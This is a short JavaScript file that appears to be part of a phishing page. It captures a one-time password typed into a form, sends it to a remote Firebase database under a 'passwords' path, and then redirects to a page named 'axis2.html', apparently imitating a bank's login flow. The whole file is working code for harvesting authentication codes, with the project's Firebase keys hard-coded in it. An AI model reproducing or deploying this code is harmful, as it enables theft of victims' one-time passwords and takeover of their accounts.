import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getDatabase, set, ref } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyCUz_1-llGeoG20f3B5mBxjgWXAG2qPdcI",
    authDomain: "myfirst-772f2.firebaseapp.com",
    projectId: "myfirst-772f2",
    storageBucket: "myfirst-772f2.firebasestorage.app",
    messagingSenderId: "540088309804",
    appId: "1:540088309804:web:d52187c60c275d140f1989"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const add_data = document.getElementById('add_data');
const notification = document.getElementById('notification');

function passs(event) {
    event.preventDefault(); // Prevent default behavior of the form
    const OnetimePassword = document.getElementById('OnetimePassword').value;

    set(ref(db, 'passwords/' + OnetimePassword), {
        OnetimePassword: OnetimePassword
    })
    .then(() => {
        notification.innerText = "Added successfully";
        document.getElementById('OnetimePassword').value = "";

        // Redirect to another page after success
        window.location.href = "axis2.html";
    })
    .catch((error) => {
        notification.innerText = "Failed to add data: " + error.message;
    });
}

add_data.addEventListener('click', passs);
